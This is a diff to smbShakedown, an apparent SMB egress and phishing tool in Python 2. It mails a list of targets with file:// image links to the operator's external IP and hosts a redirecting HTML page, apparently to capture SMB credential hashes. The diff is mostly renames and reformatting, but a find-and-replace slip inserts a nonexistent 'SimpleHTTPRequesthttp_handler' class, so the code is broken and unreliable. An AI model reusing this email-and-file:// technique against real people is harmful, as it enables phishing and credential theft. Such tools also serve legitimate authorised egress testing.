@@ -5,10 +5,9 @@ https://github.com/NickSanzotta/smbShakedown'''
 try:
     #need to review these
     import SimpleHTTPServer
-    from SimpleHTTPServer import SimpleHTTPRequestHandler
+    from SimpleHTTPServer import SimpleHTTPRequesthttp_handler
 
     import argparse
-    from email.mime.text import MIMEText
     import getpass
     import json
     import multiprocessing
@@ -24,7 +23,6 @@ try:
     import readline
     import requests
     import signal
-    from time import sleep
 except Exception as e:
     print(str(e))
 
@@ -32,10 +30,10 @@ class Smbshakedown(object):
     '''Smbshakedown class object'''
 
     def __init__(self, sender_address, sender_name, smtp_port, recipient_name, \
-        smtp_server, smtp_username, verbose, rcpt_header, file, image_server,\
+        smtp_server, smtp_username, verbose, rcpt_header, email_file, image_server,\
         redirect_url):
         '''initialize uesr options of sender_address, sender_name, smtp_port, recipient_name, \
-        smtp_server, smtp_username, verbose, rcpt_header, file, image_server,\
+        smtp_server, smtp_username, verbose, rcpt_header, email_file, image_server,\
         redirect_url'''
 
         #static rc file location and name
@@ -53,8 +51,7 @@ class Smbshakedown(object):
         self.requests_useragent = {'User-agent': 'curl/7.52.1'}
         self.redirect_url = 'http://{}'.format(''.join(redirect_url))
         self.image_server_port = int(''.join(image_server))
-        self.recipients_file = ''.join(file)
-        
+        self.recipients_file = ''.join(email_file)
 
         #call methods to autodiscover local and external IPs
         self.external_ip = self.get_external_ip().strip('\n')
@@ -74,7 +71,7 @@ class Smbshakedown(object):
     def get_external_ip(self):
         '''gets external ip from the system runnng this script by querying ifconfig.co with python-requests'''
         try:
-            external_ip = requests.get('http://ifconfig.co', headers = self.requests_useragent).content
+            external_ip = requests.get('http://ifconfig.co', headers=self.requests_useragent).content
             return external_ip
         except requests.exceptions.RequestException as e:
             print(e)
@@ -120,14 +117,14 @@ Recipients:     {9}\n').format(self.rc_file, self.sender_address, self.sender_na
 
     def yes_no(self, answer):
         '''function to handle yes/no user prompts'''
-        yes = set(['yes','y', 'ye', ''])
-        no = set(['no','n'])
+        yes = set(['yes', 'y', 'ye', ''])
+        no = set(['no', 'n'])
         while True:
             choice = raw_input(answer).lower()
             if choice in yes:
-               return True
+                return True
             elif choice in no:
-               return False
+                return False
             else:
                 print ('Please respond with \'yes\' or \'no\'\n')
 
@@ -201,6 +198,7 @@ Thanks for all your help!
 sincerely,
 <br>
 <img src=file://{4}/image/sig.jpg height="100" width="150"></a>
+.
 """
         #create email_message object with all the goodies in it
         email_message = message.format(self.sender_name, self.sender_address, \
@@ -240,13 +238,13 @@ sincerely,
         <script type="text/javascript">
             window.location.href = "{1}"
         </script>
-<title>SMB Egress Test Page.</title>
-</head>
-<br>
-<img src=file://{0}/image/foo.gif>
-</body>
+        <title>SMB Egress Test Page.</title>
+    </head>
+    <body>
+        <br>
+        <img src=file://{0}/image/foo.gif>
+    </body>
 </html>
-.
 """.format(self.external_ip, self.redirect_url)
         print('\nHTML Hosted:\n{}'.format(html))
 
@@ -259,7 +257,7 @@ sincerely,
         if self.http_server_pid is not None:
             try:
                 print('Trying to stop server process {}'.format(str(self.http_server_pid)))
-                os.kill(int(self.http_server_pid),9)
+                os.kill(int(self.http_server_pid), 9)
             except Exception as e:
                 print(e)
         #check for and list any running tmux sessions
@@ -278,10 +276,10 @@ sincerely,
             #listens on 0.0.0.0 on port supplied with -i
             addr = ("0.0.0.0", self.image_server_port)
             
-            #starts simplehttpserver as handler
-            Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+            #starts simplehttpserver as http_handler
+            http_handler = SimpleHTTPServer.SimpleHTTPRequesthttp_handler
             #starts httpd as socked server
-            httpd = SocketServer.TCPServer((addr), Handler, bind_and_activate=False)
+            httpd = SocketServer.TCPServer((addr), http_handler, bind_and_activate=False)
             httpd.allow_reuse_address = True
             server_process = multiprocessing.Process(target=httpd.serve_forever)
             server_process.daemon = False
@@ -368,7 +366,7 @@ def main():
         nargs=1,\
         help='Craft a redirect on your local server with supplied value')
 
-    parser.add_argument('-f', '--file', \
+    parser.add_argument('-f', '--email_file', \
         metavar='<target_emails.txt>', \
         nargs=1, \
         help='File with list of targeted emails')
@@ -408,7 +406,6 @@ def main():
         action='store_true')
 
     args = parser.parse_args()
-    args_dict = vars(args)
 
     #check required arguments
     #FEATURE: need validation for some (valid email, integer port numbers, etc)
@@ -430,12 +427,12 @@ def main():
     if args.rcpt_header is None:
         print('No RCPT header provided')
         sys.exit(0)
-    if args.file is None:
+    if args.email_file is None:
         print('No recipients file provided')
         sys.exit(0)
 
     #start smbshakedown class object with supplied arguments
-    c1 = Smbshakedown(args.sender_address, \
+    run_shake = Smbshakedown(args.sender_address, \
         args.sender_name, \
         args.smtp_port, \
         args.recipient_name, \
@@ -443,21 +440,20 @@ def main():
         args.smtp_username, \
         args.verbose, \
         args.rcpt_header, \
-        args.file, \
+        args.email_file, \
         args.image_server, \
         args.redirect_url)
 
     #call class methods
-    c1.get_external_ip()
-    c1.prompts()
-    c1.validate()
-    c1.smb_server()
-    c1.craft_http_content()
-    c1.smtp_connection()
-
+    run_shake.get_external_ip()
+    run_shake.prompts()
+    run_shake.validate()
+    run_shake.smb_server()
+    run_shake.craft_http_content()
+    run_shake.smtp_connection()
 
     #this goes last since it runs forever -- need to fix
-    c1.run_http_server()
+    run_shake.run_http_server()
 
 if __name__ == "__main__":
     main()
